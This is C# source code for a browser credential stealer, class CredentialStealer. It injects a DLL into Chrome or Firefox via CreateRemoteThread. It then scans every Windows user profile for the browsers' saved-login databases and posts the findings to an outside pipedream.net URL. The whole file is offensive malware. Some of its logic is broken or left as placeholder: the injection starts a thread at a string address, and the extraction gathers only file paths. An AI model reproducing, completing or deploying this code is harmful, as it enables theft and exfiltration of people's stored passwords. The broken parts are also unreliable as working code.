using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

class CredentialStealer
{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    static async Task Main(string[] args)
    {
        string dllPath = @"C:\Path\To\InjectedDLL.dll"; // Specify the correct DLL path
        string processName = "chrome"; // or "firefox"

        // Inject DLL into the target process
        InjectDLL(dllPath, processName);

        // Retrieve and send credentials
        string[] userProfiles = GetLocalUserProfiles();
        foreach (string userProfile in userProfiles)
        {
            string chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default\Login Data");
            string firefoxPath = Path.Combine(userProfile, @"AppData\Roaming\Mozilla\Firefox\Profiles\*.default\signons.sqlite");

            string credentials = ExtractCredentials(chromePath, firefoxPath);

            if (!string.IsNullOrEmpty(credentials))
            {
                await SendCredentials(credentials);
            }
        }
    }

    static string[] GetLocalUserProfiles()
    {
        string userProfilesDir = @"C:\Users";
        string[] userProfiles = Directory.GetDirectories(userProfilesDir);
        return userProfiles;
    }

    static string ExtractCredentials(string chromePath, string firefoxPath)
    {
        // Placeholder for credentials (you can modify this part as needed)
        string credentials = "";

        if (File.Exists(chromePath))
        {
            // Logic to extract credentials from Chrome
            credentials += $"Chrome: {chromePath}\n";
        }

        if (File.Exists(firefoxPath.Replace("*", "")))
        {
            // Logic to extract credentials from Firefox
            credentials += $"Firefox: {firefoxPath.Replace("*", "")}\n";
        }

        return credentials;
    }

    static async Task SendCredentials(string credentials)
    {
        string serverUrl = "https://eocpe8aqj4djil7.m.pipedream.net"; // Replace with your RequestBin URL
        using (HttpClient client = new HttpClient())
        {
            var content = new StringContent($"credentials={Uri.EscapeDataString(credentials)}", Encoding.UTF8, "application/x-www-form-urlencoded");
            HttpResponseMessage response = await client.PostAsync(serverUrl, content);
            string responseBody = await response.Content.ReadAsStringAsync();
            Console.WriteLine("Credentials sent: " + responseBody);
        }
    }

    static void InjectDLL(string dllPath, string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length > 0)
        {
            Process targetProcess = processes[0];

            IntPtr processHandle = OpenProcess(0x001F0FFF, false, targetProcess.Id);
            IntPtr dllAddress = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)(dllPath.Length + 1), 0x1000, 0x40);
            WriteProcessMemory(processHandle, dllAddress, Encoding.UTF8.GetBytes(dllPath + "\0"), (uint)(dllPath.Length + 1), out IntPtr bytesWritten);
            CreateRemoteThread(processHandle, IntPtr.Zero, 0, dllAddress, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}